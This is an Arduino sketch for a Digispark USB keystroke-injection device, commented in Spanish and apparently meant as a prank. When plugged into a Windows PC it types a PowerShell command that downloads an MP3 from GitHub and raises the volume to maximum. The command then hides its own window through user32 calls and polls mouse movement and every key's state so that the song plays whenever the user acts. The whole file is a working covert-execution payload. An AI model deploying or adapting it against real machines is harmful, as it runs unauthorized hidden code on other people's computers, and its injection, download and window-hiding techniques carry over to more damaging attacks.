#include "DigiKeyboard.h"

void setup() {
  pinMode(1, OUTPUT);
  digitalWrite(1, LOW);
}

void loop() {
  DigiKeyboard.delay(5000); 

  // 1. Abrir PowerShell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print(F("powershell")); 
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.delay(3000); 

  // 2. Cargar librerías y descargar audio
  DigiKeyboard.print(F("Add-Type -AssemblyName System.Windows.Forms,PresentationCore;"));
  DigiKeyboard.print(F("$u='https://github.com/Greyi/PortafolioTareas2/raw/main/DuHast.mp3';$f=\"$env:TEMP\\DuHast.mp3\";"));
  DigiKeyboard.print(F("if(!(Test-Path $f)){Invoke-WebRequest $u -OutFile $f};"));

  // 3. Configurar audio y SUBIR VOLUMEN (Corregido)
  // Usamos un bucle (1..50) para presionar la tecla de volumen 50 veces seguidas
  DigiKeyboard.print(F("$p=New-Object System.Windows.Media.MediaPlayer;$p.Open([uri]$f);$p.Volume=1.0;"));
  DigiKeyboard.print(F("$w=New-Object -ComObject WScript.Shell; 1..50 | % { $w.SendKeys([char]175) };")); 
  
  // 4. Preparar ocultación
  DigiKeyboard.print(F("$s='[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr h,int n);[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int v);';"));
  DigiKeyboard.print(F("$t=Add-Type -MemberDefinition $s -Name 'W' -PassThru;"));

  // 5. Ocultar ventana (Con protección anti-errores)
  DigiKeyboard.print(F("try{$h=(Get-Process -Id $PID).MainWindowHandle;if($h -eq 0){$h=(Get-Process -Name powershell | Where-Object {$_.MainWindowTitle -ne ''}).MainWindowHandle};$t::ShowWindow($h,0)}catch{};"));
  DigiKeyboard.print(F("(New-Object -ComObject Shell.Application).MinimizeAll();"));

  // 6. Bucle de vigilancia
  DigiKeyboard.print(F("$m=[Windows.Forms.Cursor];$o=$m::Position;while(1){$n=$m::Position;$k=0;1..254|% {if($t::GetAsyncKeyState($_) -band 0x8000){$k=1}};"));
  DigiKeyboard.print(F("if(($n.X -ne $o.X -or $n.Y -ne $o.Y) -or ($k -eq 1)){$p.Play();$c=0}else{$c++;if($c -gt 15){$p.Stop()}};"));
  DigiKeyboard.print(F("$o=$n;Start-Sleep -m 100}"));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for(;;){ /* Fin */ }
}